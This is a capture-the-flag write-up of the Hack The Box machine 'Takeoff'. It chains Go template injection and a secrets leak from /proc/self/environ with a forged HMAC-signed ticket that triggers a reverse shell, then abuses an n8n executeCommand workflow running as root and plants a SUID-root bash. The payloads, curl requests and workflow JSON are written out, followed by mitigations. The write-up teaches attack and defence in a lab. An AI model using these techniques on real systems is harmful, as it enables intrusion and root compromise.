# HTB — Takeoff

```
████████╗ █████╗ ██╗  ██╗███████╗ ██████╗ ███████╗███████╗
╚══██╔══╝██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗██╔════╝██╔════╝
   ██║   ███████║█████╔╝ █████╗  ██║   ██║█████╗  █████╗  
   ██║   ██╔══██║██╔═██╗ ██╔══╝  ██║   ██║██╔══╝  ██╔══╝  
   ██║   ██║  ██║██║  ██╗███████╗╚██████╔╝██║     ██║     
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝     
                       Hack The Box — Hard
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — only 22 (SSH) and 80 (nginx, a Go "Echo" app)
- [x] Mapped the site: HTB Airways, a booking app with registration, bookings and a downloadable ticket PDF
- [x] Found server-side template injection in the ticket "notes" field (it renders into the PDF)
- [x] Used the `File` template method to read `/proc/self/environ`
- [x] Leaked `TICKET_VALIDATION_TOKEN` and `N8N_API_KEY` from the environment
- [x] Reverse-engineered the check-in ticket: a Go `gob`-encoded, HMAC-signed blob whose `NotifyCmd` is executed server-side
- [x] Forged a signed ticket with `NotifyCmd` = reverse shell → RCE as `www-data`
- [x] From `www-data`, found internal services: 3000 (the app), 5678 (n8n), 3306 (MySQL)
- [x] Used the leaked `N8N_API_KEY` against the n8n public API to create an `executeCommand` workflow
- [x] The n8n command node runs as root — read the user flag and dropped a SUID-root `bash`
- [x] Ran the SUID bash for a root shell and read `root.txt`

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| whatweb | Fingerprinting the web stack (nginx, Echo/Go) |
| Burp / browser dev tools | Finding the SSTI field and the check-in request |
| zbarimg | Decoding the ticket QR to recover the gob/ticket structure |
| Go (`encoding/gob`, `crypto/hmac`) | Forging a valid signed ticket |
| curl | Driving the check-in endpoint and the internal n8n API |
| A reverse shell + nc | Catching the `www-data` shell |

---

## TL;DR

Takeoff is a Go (Echo) airline-booking app, **HTB Airways**. The ticket PDF renders a user-controlled **notes** field through Go's `text/template`, which is server-side template injection. The template exposes a `File` method, so `{{.File "/proc/self/environ"}}` reads the process environment and leaks two secrets: `TICKET_VALIDATION_TOKEN` and `N8N_API_KEY`.

The check-in flow verifies a ticket QR that is a Go **`gob`-encoded, HMAC-signed** structure containing, among other fields, a **`NotifyCmd`** string the server executes. With the leaked validation token I can sign my own ticket, so I forge one whose `NotifyCmd` is a bash reverse shell and submit it at check-in — RCE as **`www-data`**.

From `www-data`, the box is wired together by internal services on localhost: the app on 3000, **n8n** on 5678, MySQL on 3306. The leaked `N8N_API_KEY` lets me talk to n8n's public API and create a workflow with an **`executeCommand`** node. That node runs with **root** privileges, so it reads the user flag and lets me drop a SUID-root `bash`; running it gives a root shell and `root.txt`.

---

## Introduction

The theme of Takeoff is trusting data that crosses a boundary. The app trusts a user's note enough to run it through a template engine, it trusts any ticket whose signature validates, and an internal automation tool (n8n) is reachable with a leaked key and runs commands as root. Each step is the same mistake in a new place.

Two open ports, one web app, and a path that goes: template injection → secret leak → forged-signature RCE → internal API → root.

---

## Recon

A full RustScan/Nmap sweep shows just two ports:

```bash
rustscan -a 10.129.211.87 --ulimit 5000 -r 1-65535 -- -Pn -sV
```

```
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
```

`whatweb` fingerprints the web stack — nginx in front of a Go app using the **Echo** framework:

```bash
whatweb http://10.129.211.87/
# Title[Book a Seat, See the World - HTB Airways Booking], HTTPServer[nginx], X-Powered-By[Echo]
```

I added `takeoff.htb` to my hosts file and registered an account. The site is a full airline-booking flow: search flights, book, and download a **ticket PDF**. The important design detail: the booking form has a free-text **notes** field that ends up rendered inside the generated PDF.

---

## Foothold

The hint the box gives you is to look at the *document*, not the web page. The ticket notes are rendered server-side into the PDF through Go's `text/template`, so the field is a template-injection sink.

Putting `{{.}}` in the notes and downloading the ticket returns Go's default struct rendering:

```
{0xc0002e4640 0xc0003dab80}
```

Those are struct pointers — confirmation the field is evaluated as a template. The data object also exposes a `File` method, which turns the SSTI into an arbitrary file read. Reading the process environment:

```
{{.File "/proc/self/environ"}}
```

returns the server's environment, and with it two secrets:

```
USER=www-data
TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

`TICKET_VALIDATION_TOKEN` is the HMAC key the app uses to sign tickets; `N8N_API_KEY` is a public-API token for an n8n instance. Both matter later.

---

## Shell / Initial Access

Decoding a real ticket's QR with `zbarimg` shows the structure the check-in endpoint expects:

```bash
zbarimg htb-airways-5JVNFV-6.pdf
```

It is a Go **`gob`** stream wrapping a `VerifyTicketAuthenticity{ Data }` value, where `Data` is the ticket JSON followed by an HMAC. The JSON is the interesting part:

```json
{"PNR":"5JVNFV","Token":"...","Seat":"2B","Passenger":"tester a","NotifyCmd":"check-in-notify --pnr 5JVNFV --email abcd@gmail.com"}
```

On check-in the server **executes `NotifyCmd`**. It normally runs the app's own notifier, but the field is attacker-controllable as long as the whole blob carries a valid HMAC — and I have the signing token.

So I forge my own ticket: a tiny Go program that `gob`-encodes a `VerifyTicketAuthenticity` whose `Data` is my JSON (with `NotifyCmd` set to a reverse shell), appends an HMAC computed with the leaked `TICKET_VALIDATION_TOKEN`, and base64-encodes it. Getting the `gob` wire format byte-identical took a few tries (the original wraps an interface and registers the type under the `gob` package path, and `Data` is `[]byte`, not `string`), but once the header matched, the server accepted it.

Submitting the forged blob to the check-in endpoint (the field is `qr_data`, form-encoded) fires the reverse shell:

```bash
curl -s http://takeoff.htb/.../checkin --data-urlencode "qr_data=<forged-base64>"
```

```
www-data@takeoff:/opt/htb-airways/booking$ id
uid=33(www-data) gid=33(www-data)
```

---

## Escalation Path

From `www-data`, the listening sockets tell the story — everything else is bound to localhost:

```bash
ss -ltnp
```

```
127.0.0.1:3000   htb-air        # the Go app
127.0.0.1:5678   n8n            # workflow automation
127.0.0.1:3306   mysql
```

n8n on 5678 is the target, and I already leaked its public-API key from `/proc/self/environ`. The key authenticates straight to the API:

```bash
curl -s http://127.0.0.1:5678/api/v1/workflows -H "X-N8N-API-KEY: eyJ..."
```

n8n workflows can contain an **`executeCommand`** node, which runs a shell command on the host. Creating a workflow with a webhook trigger and a command node, then calling the webhook, runs whatever I want — and on this box that node runs as **root** (a `chown root:root` through it succeeds).

---

## Exploitation

Create a workflow (webhook → `executeCommand`) through the API, then trigger it:

```bash
curl -s -X POST http://127.0.0.1:5678/api/v1/workflows \
  -H "X-N8N-API-KEY: eyJ..." -H 'Content-Type: application/json' \
  -d '{"name":"pwn","nodes":[
        {"parameters":{"httpMethod":"POST","path":"pwn-x","responseMode":"lastNode"},"id":"wh1","name":"Webhook","type":"n8n-nodes-base.webhook","typeVersion":2,"position":[200,300]},
        {"parameters":{"command":"cat /root/user.txt"},"id":"cmd1","name":"Exec","type":"n8n-nodes-base.executeCommand","typeVersion":1,"position":[420,300]}
      ],"connections":{"Webhook":{"main":[[{"node":"Exec","type":"main","index":0}]]}},"settings":{}}'

curl -s -X POST http://127.0.0.1:5678/webhook/pwn-x -H 'Content-Type: application/json' -d '{}'
```

That returns the **user flag**. To turn root-level command execution into a stable interactive root shell, copy `bash`, then use the same node (running as root) to make it SUID root, and run it:

```bash
# as the low-priv user
cp /bin/bash /home/kpark/bash

# via the n8n command node (root):
chown root:root /home/kpark/bash && chmod 4755 /home/kpark/bash
```

```bash
/home/kpark/bash -p
```

```
bash-5.2# id
uid=1001 euid=0(root)
bash-5.2# cat /root/root.txt
```

---

## Rabbit Holes

**The QR looks like a pcap / crypto puzzle.** It is neither — it is a Go `gob` stream. Trying to treat the base64 as a generic structure wastes time; recognising the `gob` type header (`VerifyTicketAuthenticity`) is what unlocks it.

**Encoding the forged ticket as a bare struct or from package `main`.** `gob` embeds the full type path and interface markers. A payload encoded as `main.VerifyTicketAuthenticity`, or as a concrete struct when the original wrapped an interface, is rejected with `gob decode: ... can only be decoded from remote interface type`. The forge has to register the type under the same package path and encode `Data` as `[]byte`.

**Sending the ticket as JSON.** The check-in endpoint wants a form field named `qr_data`; a JSON body gives `payload too short`. Grab the exact field name from dev tools on a normal check-in.

---

## Flag

| Flag | Location | Value |
|---|---|---|
| User | `/root/user.txt` (group-readable, read via n8n) | `74c8f707e754e9edd392dd80b769108b` |
| Root | `/root/root.txt` | `94844c6003461d2821b253d5b635089e` |

---

## Mitigations

**Never render user input as a template.** The notes field is concatenated into a `text/template` that is then executed, which is SSTI and, via the exposed `File` method, arbitrary file read. Treat user input as data: render it with a context that escapes, never `Parse`/`Execute` a string built from it, and never expose filesystem helpers to the template.

**Don't put secrets in the environment of a process that can leak them.** One file read handed over the signing key and an API token. Secrets belong in a secrets manager or a file the app reads once and drops, not in `/proc/self/environ` where a single read-primitive exposes everything.

**Sign the whole payload and don't execute fields from it.** The ticket's `NotifyCmd` is executed server-side; a valid HMAC should authenticate *data*, not authorise *commands*. The notifier should pick from a fixed set of actions by id, never run a command string carried in the ticket — even a signed one.

**Lock down the automation tool.** n8n was reachable with a leaked key and its `executeCommand` node ran as root. Scope API keys tightly, disable `executeCommand`/community nodes where not needed, and run the service as an unprivileged user so a workflow compromise is not an instant root.

---

## Key Takeaway

Every stage of Takeoff is a trust boundary crossed by data that should have stayed inert: a note that becomes code, an environment that hands out its own secrets, a signature that is trusted to authorise a command, and an internal tool that executes as root for anyone with its key. A valid signature proves *who* sent data, never that the data is *safe to run*.

---

## If I Did It Again

Read the PDF's data model first. The `{{.}}` probe instantly shows it is a Go template over a struct; checking for a `File`/`Env` method on that struct is faster than blind payload lists.

Dump `/proc/self/environ` the moment I have any file read on a service — it is the shortest path to signing keys and API tokens, and here it held both.

Recognise `gob` by its type header before writing any forge code, and mirror the original's package path and interface wrapper from the start so the server's `Decode` accepts the first forged payload instead of the fifth.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-17 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
